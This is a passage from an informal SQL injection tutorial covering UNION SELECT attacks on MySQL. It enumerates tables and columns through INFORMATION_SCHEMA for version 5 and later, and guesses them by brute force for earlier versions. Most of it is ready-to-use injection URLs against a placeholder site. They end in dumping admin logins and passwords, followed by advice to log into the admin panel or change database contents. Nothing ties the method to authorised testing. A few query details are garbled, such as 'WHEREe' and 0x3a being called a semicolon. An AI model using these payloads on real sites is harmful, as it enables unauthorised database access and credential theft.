OBTAINING TABLES AND COLUMNS USING UNION SELECT:

As I mentioned above this step is dependent on the database version, most notably due to the fact that versions prior to version 5 do not have the INFORMATION_SCHEMA table which links everything together. This means that for versions 5 or higher we can use the Information_Schema table as a base to plant our SQLi statements whereas in versions prior to v5 we have no base to stand on and thus are stuck having to bruteforce or guess the table and column names. Below should outline the different methods used based on the version type, so make sure you are following the right method or you won’t have any luck at all...

VERSION IS >=5:

If the version is greater than or equal to version 5 then we are in luck and our work will not be nearly as hard. We will begin by taking the information we gathered above in the first few steps and now start using it to map out the database and get the table names. We will use Information_Schema table to start getting the tables, like this: 

	http://www.site.com/index.php?id=-725+UNION+SELECT+1,table_name,3,4,5+FROM+INFORMATION_SCHEMA.TABLES--

This will display a single table name in the vulnerable column 2 place on the page. OK, that is nice...but how do we speed things up to get them all? Ah, yes...we will need to use GROUP_CONCAT() statement to get more than one result at a time, like this:

  	http://www.site.com/index.php?id=-725+UNION+SELECT+1,GROUP_CONCAT(table_name),3,4,5+FROM+INFORMATION_SCHEMA.TABLES--

This will now display all of the tables in the database. This will include all of the default tables that are included and basically useless to us as they contain no real information that we can use. They also tend to make our results fall off the page if you will as there are simply too many of them. The default char count allowed to be displayed is set to 1054 so we are very limited in results we can get/use. In order to avoid this we can redefine our request statement to only get the tables for the current database we are in, like this:
          http://www.site.com/index.php?id=-725+UNION+SELECT+1,GROUP_CONCAT(table_name),3,4,5+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=database()--

This will now display all of the tables for only the current database we are in (much more useful). In order to keep the examples going we will assume that the above request resulted in us finding the following tables displayed on the page:
               
	 TABLES FOUND:  Admin, News, Ads, Users

OK, now we are getting somewhere! We have found the "Admin" and "Users" tables, which are sure to hold some juicy information. We now need to find out the columns for each of the tables we want to investigate further. We will use similar syntax but change some of the references around so we pull column info instead of table info, like this:

              http://www.site.com/index.php?id=-725+UNION+SELECT+1,GROUP_CONCAT(column_name),3,4,5+FROM+INFORMATION_SCHEMA.COLUMNS+WHEREe+TABLE_NAME=Admin

If we continue to use our examples from above, the HEX version of the table names we found become:

·         Admin = 0x41646d696e
·         News = 0x4e657773
·         Ads = 0x416473
·         Users = 0x5573657273

The new request now looks like this:

             http://www.site.com/index.php?id=-725+UNION+SELECT+1,GROUP_CONCAT(column_name),3,4,5+FROM+INFORMATION_SCHEMA.COLUMNS+WHEREe+TABLE_NAME=0x41646d696e

The page will now display a list of the columns from the Admin table in the vulnerable column 2 spot on page. In this example we will assume we found the following column names:

·         id
·         login
·         password
·         email
·         access_level

OK, so now we know the current database, the column count, the vulnerable columns, the table names for the current database, and the columns associated with the found tables. it is now time to determine which column info we want to grab and from what tables. In this example we will be extracting the details from the Admin table to get the id, login, password, email, and access_level info. We will extract the info like this:

              http://www.site.com/index.php?id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--

NOTE: 0x3a = : which can help separate the output results from one another as sometimes it can be difficult to tell where one ends and the next entry begins.

The results should be displayed on the page now showing the Admin information. Since we used GROUP_CONCAT() and not just CONCAT() we will get all entries in the table, if we used just CONCAT() we would only get the first entry. Here is what the format should look like:
·         1:admin:adminpass:admin@baddba.com:5
·         2:superuser:superpass:super@dumberdba.com:5

You can repeat the above steps as necessary until you have retrieved all of the information you want or need from the backend database. You can then do what you want with the details, like continue your investigation and look for Admin panel to login with newly found credentials or possibly connect to the database directly and start manipulating the database content itself. This sums up the Extraction method for systems running greater than or equal to version 5 (>=5). I hope you enjoyed. If you are interested in how to perform these steps for versions prior to version 5 then please continue reading.

VERSION IS <5 (i.e. v1-4):

If the version is less than version 5 then we have our work cut out for us and our chances of success are greatly reduced due to the fact that we do not have the ability to use a base, like Information_Schema in v5+. This means we will essentially have to bruteforce or guess the tables and columns to map out the database. We will start from the examples used originally above and assume we returned a version of 4.x and now want to find tables and columns. We will begin by trying to determine the table names of the current database. We will simply start with common table names and look for TRUE (No Errors) or FALSE (Errors) in the displayed results, like this:

http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+administrator--      (FALSE - Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+moderator--           (FALSE - Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+Admin--                 (TRUE - No Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+usernames--            (FALSE - Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+Users--                   (TRUE - No Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+Logins--                  (TRUE - No Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+Members--               (FALSE - Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+pass--                         (FALSE - Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+Passwords--           (TRUE - No Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,2,3,4,5+FROM+Email--                    (TRUE - No Errors)

This works very similar to how we found column count in the beginning of our tutorial. We will just be substituting possible table names and looking for positive results where no errors are displayed, which indicate to us that there is a valid table name being used. This can be time consuming and no real qoog way of knowing when you have found them all, but I suggest using your brain and trying ones you would be interested in. If you want a good list of possible column and table names you can look at the inner workings of any of your favorite SQL Injection tools, like SQLMAP or Havij for example. Based on the above we found the following tables:

·         Admin
·         Users
·         Logins
·         Passwords
·         Email

OK so we have found a few tables despite the fact it is version 4 backend DB, but now we need to see if we can find any columns so that we may extract some information successfully. We will need to change our syntax slightly to request column names for each of the tables found. We will need to input our expected column names into our vulnerable column spot we found at the beginning of our example (2,4, & 5). We will again just go down your list of possible column names and look for TRUE (No Errors) or FALSE (Errors) results on the display page since we will be connecting them to the found tables we know are there it will work. It will work like this:

http://www.site.com/index.php?id=-725+UNION+SELECT+1,username,3,4,5+FROM+Admin--   (FALSE-Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,user,3,4,5+FROM+Admin--              (FALSE-Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,id,3,4,5+FROM+Admin--                  (TRUE-No Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,login,3,4,5+FROM+Admin--             (TRUE-No Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,pass,3,4,5+FROM+Admin--              (FALSE-Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,password,3,4,5+FROM+Admin--    (TRUE-No Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,email,3,4,5+FROM+Admin--           (TRUE-NoErrors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,access,3,4,5+FROM+Admin--          (FALSE-Errors)
http://www.site.com/index.php?id=-725+UNION+SELECT+1,access_level,3,4,5+FROM+Admin-- (TRUE-NoErrors)

OK, so we found the following columns for the table Admin, you may also notice that in each of the successful requests above it should have also displayed the first entry for each of your requested columns in place of the vulnerable column on the display page:

·         id
·         login
·         password
·         email
·         access_level

As we did for v5+, we will use GROUP_CONCAT() to extract multiple columns details at once. It will look like this:

              http://www.site.com/index.php?id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
               
Remember that the 0x3a just inserts a semicolon (:) into the output display to help separate the results. The results will look something like this:
·         1:admin:adminpass:admin@baddba.com:5
·         2:superuser:superpass:super@dumberdba.com:5

This sums up the methods needed to perform basic SQLi on database that is <5. I hope you have enjoyed this overview on the basics needed to perform SQL Injection. I will also outline some tips, tricks, and generally helpful reference material below which I highly suggest reviewing to help you out when you are in certain situations where the basics are just not working.